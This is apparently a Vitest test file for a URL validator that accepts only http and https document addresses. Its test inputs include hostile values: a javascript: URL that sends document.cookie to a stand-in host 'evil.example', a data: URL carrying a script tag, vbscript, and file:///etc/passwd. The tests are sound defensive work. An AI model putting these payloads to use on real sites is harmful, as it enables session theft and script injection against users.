import { describe, expect, it } from "vitest";
import { documentUri } from "../lib/uri";

describe("documentUri", () => {
  it("takes the two schemes a document can honestly live at", () => {
    expect(documentUri("https://example.org/prospectus.txt")).toEqual({
      ok: true,
      url: "https://example.org/prospectus.txt",
    });
    expect(documentUri("http://example.org/p.txt").ok).toBe(true);
  });

  it("refuses a scheme that would run as code in the reader's page", () => {
    const r = documentUri("javascript:fetch('https://evil.example/'+document.cookie)");
    expect(r.ok).toBe(false);
    expect(r.ok === false && r.why).toContain("javascript");
  });

  it("refuses the same scheme however it is spelled", () => {
    // A parsed URL lowercases its protocol, so casing is not a way past this.
    expect(documentUri("JavaScript:alert(1)").ok).toBe(false);
    expect(documentUri("JAVASCRIPT:alert(1)").ok).toBe(false);
  });

  it("refuses markup the issuer supplies inline", () => {
    expect(documentUri("data:text/html,<script>alert(1)</script>").ok).toBe(false);
    expect(documentUri("blob:https://example.org/abc").ok).toBe(false);
    expect(documentUri("vbscript:msgbox(1)").ok).toBe(false);
  });

  it("refuses a reach into the reader's own machine", () => {
    expect(documentUri("file:///etc/passwd").ok).toBe(false);
  });

  it("refuses a relative path, which would resolve against Rialto itself", () => {
    expect(documentUri("/mandate").ok).toBe(false);
    expect(documentUri("prospectus.txt").ok).toBe(false);
  });

  it("refuses nothing at all", () => {
    expect(documentUri(undefined).ok).toBe(false);
    expect(documentUri("").ok).toBe(false);
    expect(documentUri("   ").ok).toBe(false);
  });

  it("keeps the address it was given rather than a rewritten one", () => {
    const r = documentUri("https://example.org/a/b?x=1#y");
    expect(r.ok === true && r.url).toBe("https://example.org/a/b?x=1#y");
  });
});
